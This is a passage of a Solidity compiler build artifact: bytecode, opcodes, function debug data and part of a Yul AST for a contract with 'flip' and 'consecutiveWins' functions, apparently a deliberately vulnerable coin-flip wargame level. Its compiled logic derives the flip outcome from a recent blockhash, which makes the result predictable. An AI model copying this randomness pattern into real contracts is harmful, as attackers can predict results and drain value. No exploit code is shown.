*/\n      dup3\n        /* \"#utility.yul\":2764:2773   */\n      div\n        /* \"#utility.yul\":2759:2773   */\n      swap1\n      pop\n        /* \"#utility.yul\":2594:2779   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212209a326eb189ffeb285007855b6c35f7f357dd3c031edb8b30ed9346544a75f3f064736f6c634300080f0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_20": {
									"entryPoint": null,
									"id": 20,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103678061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061019b565b610089565b60405161006291906101d7565b60405180910390f35b61007361012c565b604051610080919061020b565b60405180910390f35b6000806100a060014361013290919063ffffffff16565b4060001c905080600154036100b457600080fd5b8060018190555060006100d26002548361014890919063ffffffff16565b90506000600182146100e55760006100e8565b60015b9050841515811515036101185760008081548092919061010790610255565b919050555060019350505050610127565b60008081905550600093505050505b919050565b60005481565b60008183610140919061029d565b905092915050565b600081836101569190610300565b905092915050565b600080fd5b60008115159050919050565b61017881610163565b811461018357600080fd5b50565b6000813590506101958161016f565b92915050565b6000602082840312156101b1576101b061015e565b5b60006101bf84828501610186565b91505092915050565b6101d181610163565b82525050565b60006020820190506101ec60008301846101c8565b92915050565b6000819050919050565b610205816101f2565b82525050565b600060208201905061022060008301846101fc565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610260826101f2565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361029257610291610226565b5b600182019050919050565b60006102a8826101f2565b91506102b3836101f2565b9250828210156102c6576102c5610226565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061030b826101f2565b9150610316836101f2565b925082610326576103256102d1565b5b82820490509291505056fea26469706673582212209a326eb189ffeb285007855b6c35f7f357dd3c031edb8b30ed9346544a75f3f064736f6c634300080f0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x367 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x19B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x1D7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x12C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x20B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xA0 PUSH1 0x1 NUMBER PUSH2 0x132 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD SUB PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH2 0xD2 PUSH1 0x2 SLOAD DUP4 PUSH2 0x148 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xE5 JUMPI PUSH1 0x0 PUSH2 0xE8 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x118 JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x107 SWAP1 PUSH2 0x255 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x127 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x140 SWAP2 SWAP1 PUSH2 0x29D JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x156 SWAP2 SWAP1 PUSH2 0x300 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x178 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP2 EQ PUSH2 0x183 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x195 DUP2 PUSH2 0x16F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1B1 JUMPI PUSH2 0x1B0 PUSH2 0x15E JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1BF DUP5 DUP3 DUP6 ADD PUSH2 0x186 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1D1 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1EC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x205 DUP2 PUSH2 0x1F2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x220 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1FC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x260 DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x292 JUMPI PUSH2 0x291 PUSH2 0x226 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A8 DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x2B3 DUP4 PUSH2 0x1F2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x2C6 JUMPI PUSH2 0x2C5 PUSH2 0x226 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x30B DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x316 DUP4 PUSH2 0x1F2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x326 JUMPI PUSH2 0x325 PUSH2 0x2D1 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP11 ORIGIN PUSH15 0xB189FFEB285007855B6C35F7F357DD EXTCODECOPY SUB 0x1E 0xDB DUP12 ADDRESS 0xED SWAP4 CHAINID SLOAD 0x4A PUSH22 0xF3F064736F6C634300080F0033000000000000000000 ",
							"sourceMap": "174:728:0:-:0;;;303:77;286:94;;387:53;;;;;;;;;;433:1;415:15;:19;;;;174:728;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@consecutiveWins_7": {
									"entryPoint": 300,
									"id": 7,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@div_373": {
									"entryPoint": 328,
									"id": 373,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"@flip_86": {
									"entryPoint": 137,
									"id": 86,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"@sub_343": {
									"entryPoint": 306,
									"id": 343,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_bool": {
									"entryPoint": 390,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool": {
									"entryPoint": 411,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 456,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 508,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 471,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 523,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 768,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 669,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 355,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 498,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"increment_t_uint256": {
									"entryPoint": 597,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 550,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 721,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 350,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 367,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2782:3",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "47:35:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "57:19:3",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "73:2:3",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "67:9:3"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:3"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "40:6:3",
														"type": ""
													}
												],
												"src": "7:75:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "177:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "194:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "197:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "187:12:3"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "300:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "317:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "320:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "310:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "310:12:3"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "376:48:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "386:32:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "411:5:3"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "404:6:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "404:13:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "397:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "397:21:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "386:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "358:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "368:7:3",
														"type": ""
													}
												],
												"src": "334:90:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "470:76:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "524:16:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "533:1:3",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "536:1:3",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "526:6:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "526:12:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "526:12:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "493:5:3"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "515:5:3"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "500:14:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "500:21:3"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "490:2:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "490:32:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "483:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "483:40:3"
															},
															"nodeType": "YulIf",
															"src": "480:60:3"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "463:5:3",
														"type": ""
													}
												],
												"src": "430:116:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "601:84:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "611:29:3",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "633:6:3"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "620:12:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "620:20:3"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "611:5:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "673:5:3"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "649:23:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "649:30:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "649:30:3"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "579:6:3",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "587:3:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "595:5:3",
														"type": ""
													}
												],
												"src": "552:133:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "754:260:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "800:83:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "802:77:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "802:79:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "802:79:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "775:7:3"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "784:9:3"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "771:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "771:23:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "796:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "767:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "767:32:3"
															},
															"nodeType": "YulIf",
															"src": "764:119:3"
														},
														{
															"nodeType": "YulBlock",
															"src": "893:114:3",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "908:15:3",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "922:1:3",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "912:6:3",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "937:60:3",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "969:9:3"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "980:6:3"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "965:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "965:22:3"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "989:7:3"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "947:17:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "947:50:3"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "937:6:3"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "724:9:3",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "735:7:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "747:6:3",
														"type": ""
													}
												],
												"src": "691:323:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1079:50:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1096:3:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1116:5:3"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "1101:14:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1101:21:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1089:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1089:34:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1089:34:3"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1067:5:3",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1074:3:3",
														"type": ""
													}
												],
												"src": "1020:109:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1227:118:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1237:26:3",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1249:9:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1260:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1245:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1245:18:3"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1237:4:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1311:6:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1324:9:3"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1335:1:3",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1320:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1320:17:3"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1273:37:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1273:65:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1273:65:3"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1199:9:3",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1211:6:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1222:4:3",
														"type": ""
													}
												],
												"src": "1135:210:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1396:32:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1406:16:3",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1417:5:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1406:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1378:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1388:7:3",
														"type": ""
													}
												],
												"src": "1351:77:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1499:53:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1516:3:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1539:5:3"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "1521:17:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1521:24:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1509:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1509:37:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1509:37:3"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1487:5:3",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1494:3:3",
														"type": ""
													}
												],
												"src": "1434:118:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1656:124:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1666:26:3",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1678:9:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1689:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1674:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1674:18:3"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1666:4:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1746:6:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1759:9:3"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1770:1:3",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1755:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1755:17:3"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1702:43:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1702:71:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1702:71:3"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
